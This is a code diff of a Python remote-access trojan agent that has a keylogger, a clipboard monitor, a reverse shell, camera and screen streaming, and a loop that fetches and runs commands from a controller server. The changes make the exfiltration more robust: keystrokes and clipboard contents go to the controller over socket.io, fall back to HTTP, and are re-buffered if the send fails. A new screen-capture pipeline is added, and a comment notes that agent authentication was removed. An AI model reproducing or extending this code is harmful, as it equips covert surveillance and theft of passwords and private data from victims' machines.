-            # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
-            CAMERA_STREAM_THREAD.join(timeout=2)
-        CAMERA_STREAM_THREAD = None
+        
+        # Wait for all threads to stop
+        for thread in CAMERA_STREAM_THREADS:
+            thread.join(timeout=2)
+        
+        CAMERA_STREAM_THREADS = []
+        camera_capture_queue = None
+        camera_encode_queue = None
         log_message("Stopped camera stream.")
 
 # --- Reverse Shell Functions ---
@@ -3897,7 +4058,6 @@ def stop_reverse_shell():
         REVERSE_SHELL_THREAD = None
         log_message("Stopped reverse shell.")
 # --- Voice Control Functions ---
-
 def voice_control_handler(agent_id):
     """
     Handles voice recognition and command processing.
@@ -3975,9 +4135,12 @@ def execute_voice_command(command, agent_id):
     """Execute a command received via voice control."""
     try:
         # Send command to controller for execution
-        url = f"{SERVER_URL}/voice_command/{agent_id}"
-        response = requests.post(url, json={"command": command}, timeout=5)
-        log_message(f"Voice command '{command}' sent to controller")
+        if REQUESTS_AVAILABLE:
+            url = f"{SERVER_URL}/voice_command/{agent_id}"
+            response = requests.post(url, json={"command": command}, timeout=5)
+            log_message(f"Voice command '{command}' sent to controller")
+        else:
+            log_message("Cannot send voice command: requests library not available", "warning")
     except Exception as e:
         log_message(f"Error sending voice command: {e}")
 
@@ -4249,7 +4412,6 @@ def on_key_press(key):
 def keylogger_worker(agent_id):
     """Keylogger worker thread that sends data periodically."""
     global KEYLOGGER_ENABLED, KEYLOG_BUFFER
-    url = f"{SERVER_URL}/keylog_data/{agent_id}"
     
     while KEYLOGGER_ENABLED:
         try:
@@ -4258,31 +4420,73 @@ def keylogger_worker(agent_id):
                 data_to_send = KEYLOG_BUFFER.copy()
                 KEYLOG_BUFFER = []
                 
-                for entry in data_to_send:
-                    requests.post(url, json={"data": entry}, timeout=5)
+                # Use socket.io for better performance and consistency
+                try:
+                    if sio and sio.connected:
+                        for entry in data_to_send:
+                            sio.emit('keylog_data', {
+                                'agent_id': agent_id,
+                                'data': entry
+                            })
+                    else:
+                        log_message("Socket.io not connected, buffering keylog data", "warning")
+                        # Re-add data to buffer if connection is down
+                        KEYLOG_BUFFER.extend(data_to_send)
+                except Exception as e:
+                    log_message(f"Keylogger socket.io error: {e}")
+                    # Fallback to HTTP if socket.io fails
+                    if REQUESTS_AVAILABLE:
+                        try:
+                            url = f"{SERVER_URL}/keylog_data/{agent_id}"
+                            for entry in data_to_send:
+                                requests.post(url, json={"data": entry}, timeout=5)
+                        except Exception as http_e:
+                            log_message(f"Keylogger HTTP fallback error: {http_e}")
+                            # Re-add data to buffer for next attempt
+                            KEYLOG_BUFFER.extend(data_to_send)
+                    else:
+                        log_message("HTTP fallback not available, re-buffering keylog data", "warning")
+                        KEYLOG_BUFFER.extend(data_to_send)
             
             time.sleep(5)  # Send data every 5 seconds
         except Exception as e:
-            log_message(f"Keylogger error: {e}")
+            log_message(f"Keylogger worker error: {e}")
             time.sleep(5)
 
 def start_keylogger(agent_id):
     """Start the keylogger."""
     global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
+    
+    if not PYNPUT_AVAILABLE:
+        log_message("Error: pynput not available for keylogger", "error")
+        return False
+    
     if not KEYLOGGER_ENABLED:
-        KEYLOGGER_ENABLED = True
-        
-        # Start keyboard listener
-        listener = keyboard.Listener(on_press=on_key_press)
-        listener.daemon = True
-        listener.start()
-        
-        # Start worker thread
-        KEYLOGGER_THREAD = threading.Thread(target=keylogger_worker, args=(agent_id,))
-        KEYLOGGER_THREAD.daemon = True
-        KEYLOGGER_THREAD.start()
-        
-        log_message("Started keylogger.")
+        try:
+            KEYLOGGER_ENABLED = True
+            
+            # Start keyboard listener
+            listener = keyboard.Listener(on_press=on_key_press)
+            listener.daemon = True
+            listener.start()
+            log_message("Keyboard listener started successfully")
+            
+            # Start worker thread
+            KEYLOGGER_THREAD = threading.Thread(target=keylogger_worker, args=(agent_id,))
+            KEYLOGGER_THREAD.daemon = True
+            KEYLOGGER_THREAD.start()
+            log_message("Keylogger worker thread started successfully")
+            
+            log_message("Keylogger started successfully")
+            return True
+            
+        except Exception as e:
+            log_message(f"Failed to start keylogger: {e}", "error")
+            KEYLOGGER_ENABLED = False
+            return False
+    else:
+        log_message("Keylogger already enabled")
+        return True
 
 def stop_keylogger():
     """Stop the keylogger."""
@@ -4317,7 +4521,6 @@ def get_clipboard_content():
 def clipboard_monitor_worker(agent_id):
     """Clipboard monitor worker thread."""
     global CLIPBOARD_MONITOR_ENABLED, LAST_CLIPBOARD_CONTENT
-    url = f"{SERVER_URL}/clipboard_data/{agent_id}"
     
     while CLIPBOARD_MONITOR_ENABLED:
         try:
@@ -4326,12 +4529,32 @@ def clipboard_monitor_worker(agent_id):
                 timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                 clipboard_entry = f"{timestamp}: {current_content[:500]}{'...' if len(current_content) > 500 else ''}"
                 
-                requests.post(url, json={"data": clipboard_entry}, timeout=5)
-                LAST_CLIPBOARD_CONTENT = current_content
+                # Use socket.io for better performance and consistency
+                try:
+                    if sio and sio.connected:
+                        sio.emit('clipboard_data', {
+                            'agent_id': agent_id,
+                            'data': clipboard_entry
+                        })
+                        LAST_CLIPBOARD_CONTENT = current_content
+                    else:
+                        log_message("Socket.io not connected for clipboard data", "warning")
+                except Exception as e:
+                    log_message(f"Clipboard socket.io error: {e}")
+                    # Fallback to HTTP if socket.io fails
+                    if REQUESTS_AVAILABLE:
+                        try:
+                            url = f"{SERVER_URL}/clipboard_data/{agent_id}"
+                            requests.post(url, json={"data": clipboard_entry}, timeout=5)
+                            LAST_CLIPBOARD_CONTENT = current_content
+                        except Exception as http_e:
+                            log_message(f"Clipboard HTTP fallback error: {http_e}")
+                    else:
+                        log_message("HTTP fallback not available for clipboard data", "warning")
             
             time.sleep(2)  # Check clipboard every 2 seconds
         except Exception as e:
-            log_message(f"Clipboard monitor error: {e}")
+            log_message(f"Clipboard monitor worker error: {e}")
             time.sleep(2)
 
 def start_clipboard_monitor(agent_id):
@@ -4740,6 +4963,11 @@ def main_loop(agent_id):
 
     while True:
         try:
+            if not REQUESTS_AVAILABLE:
+                log_message("Requests library not available, cannot fetch tasks", "error")
+                time.sleep(5)
+                continue
+                
             response = requests.get(f"{SERVER_URL}/get_task/{agent_id}", timeout=10)
             task = response.json()
             command = task.get("command", "sleep")
@@ -4826,10 +5054,13 @@ def main_loop(agent_id):
             
             # Send output back to server
             try:
-                response = requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output}, timeout=5)
-                if response.status_code != 200:
-                    log_message(f"Warning: Server returned status {response.status_code} when posting output")
-            except requests.exceptions.RequestException as e:
+                if REQUESTS_AVAILABLE:
+                    response = requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output}, timeout=5)
+                    if response.status_code != 200:
+                        log_message(f"Warning: Server returned status {response.status_code} when posting output")
+                else:
+                    log_message("Cannot send output: requests library not available", "warning")
+            except Exception as e:
                 log_message(f"Failed to send output to server: {e}")
             
             # Performance monitoring
@@ -5131,8 +5362,7 @@ def kill_task_manager():
     except Exception as e:
         return f"Task Manager termination failed: {e}"
 
-# OLD MAIN BLOCK - REMOVED (DUPLICATE)
-# This was the old main execution block that has been replaced by the new agent_main() function
+# Main execution logic is handled by agent_main() function at the end of the file
 
 # ========================================================================================
 # HIGH PERFORMANCE CAPTURE MODULE
@@ -5467,815 +5697,12 @@ class AdaptiveQualityManager:
         
         if new_quality != current_quality:
             self.capture.set_quality(new_quality)
-# ========================================================================================
-# LOW LATENCY INPUT MODULE
-# From: low_latency_input.py
-# ========================================================================================
-
 # Fast serialization
 try:
     import msgpack
     HAS_MSGPACK = True
 except ImportError:
     HAS_MSGPACK = False
-
-# Performance optimizations
-if PYAUTOGUI_AVAILABLE:
-    pyautogui.FAILSAFE = False
-    pyautogui.PAUSE = 0  # Remove delay between commands
-class LowLatencyInputHandler:
-    """Ultra-low latency input handling system"""
-    
-    def __init__(self, max_queue_size: int = 1000):
-        self.max_queue_size = max_queue_size
-        self.input_queue = queue.Queue(maxsize=max_queue_size)
-        self.processing_thread = None
-        self.running = False
-        
-        # Input controllers
-        self.mouse_controller = mouse.Controller()
-        self.keyboard_controller = keyboard.Controller()
-        
-        # Performance tracking
-        self.input_count = 0
-        self.last_input_time = time.time()
-        self.processing_times = []
-        
-        # Input state caching for smooth movement
-        self.last_mouse_pos = self.mouse_controller.position
-        self.mouse_acceleration = 1.0
-        self.smooth_mouse = True
-    
-    def start(self):
-        """Start the input processing thread"""
-        if self.running:
-            return
-        
-        self.running = True
-        self.processing_thread = threading.Thread(
-            target=self._process_input_loop,
-            daemon=True
-        )
-        self.processing_thread.start()
-    
-    def stop(self):
-        """Stop input processing"""
-        self.running = False
-        if self.processing_thread:
-            self.processing_thread.join(timeout=1.0)
-    
-    def handle_input(self, input_data) -> bool:
-        """Queue input for processing"""
-        try:
-            if self.input_queue.full():
-                # Drop oldest input if queue is full (prefer latest)
-                try:
-                    self.input_queue.get_nowait()
-                except queue.Empty:
-                    pass
-            
-            # Add timestamp for latency measurement
-            input_data['timestamp'] = time.time()
-            self.input_queue.put_nowait(input_data)
-            return True
-            
-        except queue.Full:
-            return False
-    
-    def _process_input_loop(self):
-        """Main input processing loop"""
-        while self.running:
-            try:
-                # Get input with timeout
-                input_data = self.input_queue.get(timeout=0.1)
-                
-                # Measure processing latency
-                process_start = time.time()
-                received_time = input_data.get('timestamp', process_start)
-                
-                # Process the input
-                self._execute_input(input_data)
-                
-                # Track performance
-                process_time = time.time() - process_start
-                total_latency = time.time() - received_time
-                
-                self._update_performance_stats(process_time, total_latency)
-                self.input_count += 1
-                
-            except queue.Empty:
-                continue
-            except Exception as e:
-                pass
-    
-    def _execute_input(self, input_data):
-        """Execute the input command with optimal performance"""
-        action = input_data.get('action')
-        data = input_data.get('data', {})
-        
-        try:
-            if action == 'mouse_move':
-                self._handle_mouse_move(data)
-            elif action == 'mouse_click':
-                self._handle_mouse_click(data)
-            elif action == 'mouse_scroll':
-                self._handle_mouse_scroll(data)
-            elif action == 'key_press':
-                self._handle_key_press(data)
-            elif action == 'key_release':
-                self._handle_key_release(data)
-            elif action == 'key_type':
-                self._handle_key_type(data)
-                
-        except Exception as e:
-            pass
-    
-    def _handle_mouse_move(self, data):
-        """Handle mouse movement with smoothing"""
-        try:
-            # Get coordinates
-            if 'absolute' in data:
-                x, y = data['absolute']['x'], data['absolute']['y']
-                
-                # Apply acceleration/sensitivity
-                sensitivity = data.get('sensitivity', 1.0)
-                if sensitivity != 1.0:
-                    current_x, current_y = self.mouse_controller.position
-                    x = current_x + (x - current_x) * sensitivity
-                    y = current_y + (y - current_y) * sensitivity
-                
-                # Direct position setting (fastest)
-                self.mouse_controller.position = (int(x), int(y))
-                
-            elif 'relative' in data:
-                dx, dy = data['relative']['x'], data['relative']['y']
-                sensitivity = data.get('sensitivity', 1.0)
-                
-                # Apply relative movement
-                current_x, current_y = self.mouse_controller.position
-                new_x = current_x + int(dx * sensitivity)
-                new_y = current_y + int(dy * sensitivity)
-                
-                self.mouse_controller.position = (new_x, new_y)
-            
-            # Update cached position
-            self.last_mouse_pos = self.mouse_controller.position
-            
-        except Exception as e:
-            pass
-    
-    def _handle_mouse_click(self, data):
-        """Handle mouse clicks"""
-        try:
-            button_map = {
-                'left': mouse.Button.left,
-                'right': mouse.Button.right,
-                'middle': mouse.Button.middle
-            }
-            
-            button = data.get('button', 'left')
-            clicks = data.get('clicks', 1)
-            pressed = data.get('pressed', True)
-            
-            mouse_button = button_map.get(button, mouse.Button.left)
-            
-            if pressed:
-                for _ in range(clicks):
-                    self.mouse_controller.click(mouse_button)
-            else:
-                # Handle button release if needed
-                pass
-                
-        except Exception as e:
-            pass
-    
-    def _handle_mouse_scroll(self, data):
-        """Handle mouse scrolling"""
-        try:
-            dx = data.get('dx', 0)
-            dy = data.get('dy', 0)
-            
-            if dx != 0 or dy != 0:
-                self.mouse_controller.scroll(dx, dy)
-                
-        except Exception as e:
-            pass
-    
-    def _handle_key_press(self, data):
-        """Handle key press"""
-        try:
-            key = data.get('key')
-            if not key:
-                return
-            
-            # Handle special keys
-            if key.startswith('Key.'):
-                # Special key like Key.enter, Key.ctrl, etc.
-                key_name = key[4:]  # Remove 'Key.' prefix
-                special_key = getattr(keyboard.Key, key_name, None)
-                if special_key:
-                    self.keyboard_controller.press(special_key)
-            else:
-                # Regular character
-                self.keyboard_controller.press(key)
-                
-        except Exception as e:
-            pass
-    
-    def _handle_key_release(self, data):
-        """Handle key release"""
-        try:
-            key = data.get('key')
-            if not key:
-                return
-            
-            # Handle special keys
-            if key.startswith('Key.'):
-                key_name = key[4:]
-                special_key = getattr(keyboard.Key, key_name, None)
-                if special_key:
-                    self.keyboard_controller.release(special_key)
-            else:
-                self.keyboard_controller.release(key)
-                
-        except Exception as e:
-            pass
-    
-    def _handle_key_type(self, data):
-        """Handle text typing"""
-        try:
-            text = data.get('text', '')
-            if text:
-                # Use direct character typing for best performance
-                for char in text:
-                    self.keyboard_controller.press(char)
-                    self.keyboard_controller.release(char)
-                
-        except Exception as e:
-            pass
-    
-    def _update_performance_stats(self, process_time: float, total_latency: float):
-        """Update performance statistics"""
-        self.processing_times.append({
-            'process_time': process_time,
-            'total_latency': total_latency,
-            'timestamp': time.time()
-        })
-        
-        # Keep only recent samples
-        if len(self.processing_times) > 1000:
-            self.processing_times.pop(0)
-    
-    def get_performance_stats(self):
-        """Get performance statistics"""
-        if not self.processing_times:
-            return {
-                'input_count': self.input_count,
-                'queue_size': self.input_queue.qsize(),
-                'avg_process_time': 0,
-                'avg_latency': 0,
-                'max_latency': 0,
-                'min_latency': 0
-            }
-        
-        recent_times = self.processing_times[-100:]  # Last 100 samples
-        process_times = [t['process_time'] for t in recent_times]
-        latencies = [t['total_latency'] for t in recent_times]
-        
-        return {
-            'input_count': self.input_count,
-            'queue_size': self.input_queue.qsize(),
-            'avg_process_time': sum(process_times) / len(process_times) * 1000,  # ms
-            'avg_latency': sum(latencies) / len(latencies) * 1000,  # ms
-            'max_latency': max(latencies) * 1000,  # ms
-            'min_latency': min(latencies) * 1000,  # ms
-            'samples': len(recent_times)
-        }
-    
-    def set_mouse_acceleration(self, acceleration: float):
-        """Set mouse acceleration factor"""
-        self.mouse_acceleration = max(0.1, min(5.0, acceleration))
-    
-    def clear_queue(self):
-        """Clear the input queue"""
-        while not self.input_queue.empty():
-            try:
-                self.input_queue.get_nowait()
-            except queue.Empty:
-                break
-
-
-class InputMessageEncoder:
-    """Fast message encoding/decoding for input data"""
-    
-    def __init__(self):
-        self.use_msgpack = HAS_MSGPACK
-    
-    def encode(self, data) -> bytes:
-        """Encode input data to bytes"""
-        try:
-            if self.use_msgpack:
-                return msgpack.packb(data)
-            else:
-                return json.dumps(data).encode('utf-8')
-        except Exception as e:
-            return b''
-    
-    def decode(self, data: bytes):
-        """Decode bytes to input data"""
-        try:
-            if self.use_msgpack:
-                return msgpack.unpackb(data, raw=False)
-            else:
-                return json.loads(data.decode('utf-8'))
-        except Exception as e:
-            return None
-
-# ========================================================================================
-# WEBSOCKET STREAMING MODULE
-# From: websocket_streaming.py
-# ========================================================================================
-
-try:
-    import uvloop
-    HAS_UVLOOP = True
-except ImportError:
-    HAS_UVLOOP = False
-
-class WebSocketStreamingServer:
-    """High-performance WebSocket streaming server"""
-    
-    def __init__(self, host: str = "localhost", port: int = 8765, 
-                 max_clients: int = 10, target_fps: int = 60):
-        self.host = host
-        self.port = port
-        self.max_clients = max_clients
-        self.target_fps = target_fps
-        
-        # Client management
-        self.clients = set()
-        self.client_stats = {}
-        
-        # Streaming components
-        self.capture = None
-        self.frame_queue = queue.Queue(maxsize=120)  # 2 seconds buffer at 60fps
-        self.running = False
-        
-        # Performance tracking
-        self.frames_sent = 0
-        self.bytes_sent = 0
-        self.start_time = time.time()
-    
-    async def start_server(self):
-        """Start the WebSocket server"""
-        if HAS_UVLOOP and hasattr(asyncio, 'set_event_loop_policy'):
-            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
-        
-        self.running = True
-        
-        # Initialize capture system
-        try:
-            self.capture = HighPerformanceCapture(
-                target_fps=self.target_fps, 
-                quality=85, 
-                enable_delta_compression=True
-            )
-            self.capture.start_capture_stream(self._frame_callback)
-        except:
-            return
-        
-        # Start frame distribution task
-        asyncio.create_task(self._distribute_frames())
-        
-        # Start the WebSocket server
-        async with websockets.serve(
-            self._handle_client,
-            self.host,
-            self.port,
-            max_size=1024*1024*10,  # 10MB max message size
-            ping_interval=20,
-            ping_timeout=10,
-            compression=None  # Disable compression for speed
-        ):
-            await asyncio.Future()  # Run forever
-    
-    async def _handle_client(self, websocket, path):
-        """Handle new client connection"""
-        client_id = f"{websocket.remote_address[0]}:{websocket.remote_address[1]}"
-        
-        if len(self.clients) >= self.max_clients:
-            await websocket.close(code=1013, reason="Server full")
-            return
-        
-        self.clients.add(websocket)
-        self.client_stats[client_id] = {
-            'connected_at': time.time(),
-            'frames_sent': 0,
-            'bytes_sent': 0,
-            'last_activity': time.time()
-        }
-        
-        try:
-            # Send initial connection message
-            await self._send_to_client(websocket, {
-                'type': 'connection',
-                'message': 'Connected to high-performance stream',
-                'fps': self.target_fps,
-                'features': {
-                    'high_performance_capture': True,
-                    'msgpack': HAS_MSGPACK,
-                    'uvloop': HAS_UVLOOP
-                }
-            })
-            
-            # Handle client messages
-            async for message in websocket:
-                await self._handle_client_message(websocket, client_id, message)
-                
-        except websockets.exceptions.ConnectionClosed:
-            pass
-        except Exception as e:
-            pass
-        finally:
-            self.clients.discard(websocket)
-            self.client_stats.pop(client_id, None)
-    
-    async def _handle_client_message(self, websocket, client_id: str, message: str):
-        """Handle incoming client messages"""
-        try:
-            data = json.loads(message)
-            msg_type = data.get('type')
-            
-            if msg_type == 'ping':
-                await self._send_to_client(websocket, {'type': 'pong', 'timestamp': time.time()})
-            elif msg_type == 'stats_request':
-                stats = self._get_server_stats()
-                await self._send_to_client(websocket, {'type': 'stats', 'data': stats})
-            elif msg_type == 'quality_change':
-                new_quality = data.get('quality', 85)
-                if self.capture:
-                    self.capture.set_quality(new_quality)
-                await self._send_to_client(websocket, {
-                    'type': 'quality_changed', 
-                    'quality': new_quality
-                })
-            
-            # Update client activity
-            self.client_stats[client_id]['last_activity'] = time.time()
-            
-        except json.JSONDecodeError:
-            pass
-        except Exception as e:
-            pass
-    
-    def _frame_callback(self, frame_data: bytes):
-        """Callback for captured frames"""
-        if frame_data and frame_data != b'DELTA_UNCHANGED':
-            try:
-                # Add frame to queue (non-blocking)
-                if not self.frame_queue.full():
-                    self.frame_queue.put_nowait({
-                        'data': frame_data,
-                        'timestamp': time.time()
-                    })
-                else:
-                    # Drop oldest frame if queue is full
-                    try:
-                        self.frame_queue.get_nowait()
-                        self.frame_queue.put_nowait({
-                            'data': frame_data,
-                            'timestamp': time.time()
-                        })
-                    except queue.Empty:
-                        pass
-            except Exception as e:
-                pass
-    
-    async def _distribute_frames(self):
-        """Distribute frames to all connected clients"""
-        while self.running:
-            try:
-                # Get frame from queue (non-blocking)
-                try:
-                    frame_data = self.frame_queue.get_nowait()
-                except queue.Empty:
-                    await asyncio.sleep(0.001)  # 1ms sleep
-                    continue
-                
-                if not self.clients:
-                    continue
-                
-                # Prepare frame message
-                frame_message = {
-                    'type': 'frame',
-                    'timestamp': frame_data['timestamp'],
-                    'data': base64.b64encode(frame_data['data']).decode('utf-8')
-                }
-                
-                # Handle different frame types
-                if frame_data['data'].startswith(b'LZ4_COMPRESSED'):
-                    frame_message['encoding'] = 'lz4'
-                    frame_message['data'] = base64.b64encode(frame_data['data'][14:]).decode('utf-8')
-                
-                # Send to all clients concurrently
-                tasks = []
-                for client in list(self.clients):  # Create a copy to avoid modification during iteration
-                    tasks.append(self._send_frame_to_client(client, frame_message))
-                
-                if tasks:
-                    await asyncio.gather(*tasks, return_exceptions=True)
-                
-                self.frames_sent += 1
-                self.bytes_sent += len(frame_data['data'])
-                
-            except Exception as e:
-                await asyncio.sleep(0.01)
-    
-    async def _send_frame_to_client(self, websocket, frame_message):
-        """Send frame to a specific client"""
-        try:
-            if websocket in self.clients:
-                if HAS_MSGPACK:
-                    # Use MessagePack for better performance
-                    data = msgpack.packb(frame_message)
-                    await websocket.send(data)
-                else:
-                    # Fallback to JSON
-                    await websocket.send(json.dumps(frame_message))
-                
-                # Update client stats
-                client_id = f"{websocket.remote_address[0]}:{websocket.remote_address[1]}"
-                if client_id in self.client_stats:
-                    self.client_stats[client_id]['frames_sent'] += 1
-                    self.client_stats[client_id]['bytes_sent'] += len(frame_message.get('data', ''))
-                    
-        except websockets.exceptions.ConnectionClosed:
-            self.clients.discard(websocket)
-        except Exception as e:
-            pass
-    
-    async def _send_to_client(self, websocket, message):
-        """Send a message to a specific client"""
-        try:
-            if HAS_MSGPACK:
-                data = msgpack.packb(message)
-                await websocket.send(data)
-            else:
-                await websocket.send(json.dumps(message))
-        except Exception as e:
-            pass
-    
-    def _get_server_stats(self):
-        """Get server performance statistics"""
-        uptime = time.time() - self.start_time
-        avg_fps = self.frames_sent / uptime if uptime > 0 else 0
-        avg_bandwidth = self.bytes_sent / uptime if uptime > 0 else 0
-        
-        capture_stats = {}
-        if self.capture:
-            capture_stats = self.capture.get_stats()
-        
-        return {
-            'uptime': uptime,
-            'connected_clients': len(self.clients),
-            'frames_sent': self.frames_sent,
-            'bytes_sent': self.bytes_sent,
-            'avg_fps': avg_fps,
-            'avg_bandwidth': avg_bandwidth,
-            'frame_queue_size': self.frame_queue.qsize(),
-            'capture_stats': capture_stats,
-            'client_stats': self.client_stats
-        }
-    
-    def stop_server(self):
-        """Stop the streaming server"""
-        self.running = False
-        if self.capture:
-            self.capture.stop_capture_stream()
-
-# ========================================================================================
-# OPTIMIZED DASHBOARD HTML CONTENT
-# From: optimized_dashboard.html
-# ========================================================================================
-
-OPTIMIZED_DASHBOARD_HTML = """<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>High-Performance Dashboard - 60 FPS Streaming</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
-            color: #ffffff;
-            overflow-x: hidden;
-        }
-        .header {
-            background: rgba(0, 0, 0, 0.8);
-            padding: 15px 20px;
-            border-bottom: 2px solid #00ff88;
-            backdrop-filter: blur(10px);
-        }
-        .header h1 {
-            color: #00ff88;
-            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
-        }
-        .performance-badge {
-            display: inline-block;
-            background: linear-gradient(45deg, #ff6b6b, #feca57);
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-            margin-left: 15px;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-        .container {
-            display: grid;
-            grid-template-columns: 1fr 300px;
-            height: calc(100vh - 80px);
-            gap: 20px;
-            padding: 20px;
-        }
-        .stream-container {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            padding: 20px;
-            border: 1px solid rgba(0, 255, 136, 0.3);
-            position: relative;
-            overflow: hidden;
-        }
-        .stream-video {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            border-radius: 10px;
-            background: #000;
-        }
-        .stream-overlay {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            background: rgba(0, 0, 0, 0.8);
-            padding: 15px;
-            border-radius: 10px;
-            min-width: 200px;
-        }
-        .fps-counter {
-            font-size: 24px;
-            font-weight: bold;
-            color: #00ff88;
-            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
-        }
-        .latency-indicator {
-            margin-top: 10px;
-        }
-        .latency-value {
-            font-size: 18px;
-            font-weight: bold;
-        }
-        .latency-low { color: #00ff88; }
-        .latency-medium { color: #feca57; }
-        .latency-high { color: #ff6b6b; }
-        .controls-panel {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            padding: 20px;
-            border: 1px solid rgba(0, 255, 136, 0.3);
-            height: fit-content;
-        }
-        .control-section {
-            margin-bottom: 25px;
-        }
-        .control-section h3 {
-            color: #00ff88;
-            margin-bottom: 15px;
-            font-size: 16px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .btn {
-            background: linear-gradient(45deg, #00ff88, #00d4aa);
-            border: none;
-            padding: 12px 20px;
-            border-radius: 8px;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 5px;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            width: 100%;
-        }
-        .btn:hover {
-            background: linear-gradient(45deg, #00d4aa, #00ff88);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4);
-        }
-        .btn-danger {
-            background: linear-gradient(45deg, #ff6b6b, #ff4757);
-        }
-        .btn-danger:hover {
-            background: linear-gradient(45deg, #ff4757, #ff6b6b);
-            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
-        }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <h1>High-Performance Dashboard<span class="performance-badge">60 FPS • Sub-2s Latency</span></h1>
-    </div>
-    <div class="container">
-        <div class="stream-container">
-            <img id="streamVideo" class="stream-video" alt="High-Performance Stream" />
-            <div class="stream-overlay">
-                <div class="fps-counter"><span id="fpsValue">0</span> FPS</div>
-                <div class="latency-indicator">Latency: <span id="latencyValue" class="latency-value latency-low">0ms</span></div>
-            </div>
-        </div>
-        <div class="controls-panel">
-            <div class="control-section">
-                <h3>Stream Control</h3>
-                <button class="btn" onclick="startOptimizedStream()">Start 60 FPS Stream</button>
-                <button class="btn btn-danger" onclick="stopStream()">Stop Stream</button>
-                <button class="btn" onclick="startWebSocketStream()">WebSocket Stream</button>
-            </div>
-        </div>
-    </div>
-    <script>
-        let streamActive = false;
-        let webSocketStream = null;
-        let frameCount = 0;
-        let startTime = Date.now();
-
-        function startWebSocketStream() {
-            if (webSocketStream) {
-                webSocketStream.close();
-            }
-            // Detect if we're using HTTPS and use appropriate WebSocket protocol
-            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-            const host = window.location.hostname;
-            const port = window.location.port;
-            webSocketStream = new WebSocket(`${protocol}//${host}:8765`);
-            
-            webSocketStream.onmessage = function(event) {
-                try {
-                    const data = JSON.parse(event.data);
-                    if (data.type === 'frame') {
-                        updateStreamFrame(data);
-                    }
-                } catch (e) {
-                    console.error('WebSocket message error:', e);
-                }
-            };
-        }
-
-        function updateStreamFrame(frameData) {
-            const streamVideo = document.getElementById('streamVideo');
-            streamVideo.src = 'data:image/jpeg;base64,' + frameData.data;
-            
-            frameCount++;
-            const now = Date.now();
-            const elapsed = (now - startTime) / 1000;
-            const fps = Math.round(frameCount / elapsed);
-            document.getElementById('fpsValue').textContent = fps;
-            
-            const latency = now - (frameData.timestamp * 1000);
-            document.getElementById('latencyValue').textContent = Math.round(latency) + 'ms';
-        }
-
-        function startOptimizedStream() {
-            streamActive = true;
-            console.log('Optimized stream started');
-        }
-
-        function stopStream() {
-            streamActive = false;
-            if (webSocketStream) {
-                webSocketStream.close();
-                webSocketStream = null;
-            }
-            console.log('Stream stopped');
-        }
-
-        document.addEventListener('DOMContentLoaded', function() {
-            setTimeout(startWebSocketStream, 1000);
-        });
-    </script>
-</body>
-</html>"""
 # ========================================================================================
 # PROCESS TERMINATION TEST FUNCTIONS
 # From: test_process_termination.py
@@ -7904,3 +7331,118 @@ if __name__ == "__main__":
             pass
 
 # Agent authentication removed - direct access enabled
+
+# Modern non-blocking streaming pipeline for screen streaming
+STREAMING_ENABLED = False
+STREAM_THREADS = []
+capture_queue = None
+encode_queue = None
+
+TARGET_FPS = 15
+CAPTURE_QUEUE_SIZE = 5
+ENCODE_QUEUE_SIZE = 5
+
+
+def screen_capture_worker(agent_id):
+    import time
+    global STREAMING_ENABLED, capture_queue
+    import mss
+    import numpy as np
+    with mss.mss() as sct:
+        monitors = sct.monitors
+        monitor_index = 1
+        width = monitors[monitor_index][2] - monitors[monitor_index][0]
+        height = monitors[monitor_index][3] - monitors[monitor_index][1]
+        if width > 1280:
+            scale = 1280 / width
+            width = int(width * scale)
+            height = int(height * scale)
+        frame_time = 1.0 / TARGET_FPS
+        while STREAMING_ENABLED:
+            start = time.time()
+            sct_img = sct.grab(monitors[monitor_index])
+            img = np.array(sct_img)
+            if img.shape[1] != width or img.shape[0] != height:
+                img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
+            if img.shape[2] == 4:
+                img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
+            # Non-blocking put, drop oldest if full
+            try:
+                if capture_queue.full():
+                    capture_queue.get_nowait()
+                capture_queue.put_nowait(img)
+            except queue.Full:
+                pass
+            elapsed = time.time() - start
+            sleep_time = max(0, frame_time - elapsed)
+            if sleep_time > 0:
+                time.sleep(sleep_time)
+
+def screen_encode_worker(agent_id):
+    global STREAMING_ENABLED, capture_queue, encode_queue
+    while STREAMING_ENABLED:
+        try:
+            img = capture_queue.get(timeout=0.5)
+        except queue.Empty:
+            continue
+        # H.264 encode (for now, JPEG fallback)
+        is_success, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 80])
+        if is_success:
+            try:
+                if encode_queue.full():
+                    encode_queue.get_nowait()
+                encode_queue.put_nowait(encoded.tobytes())
+            except queue.Full:
+                pass
+
+def screen_send_worker(agent_id):
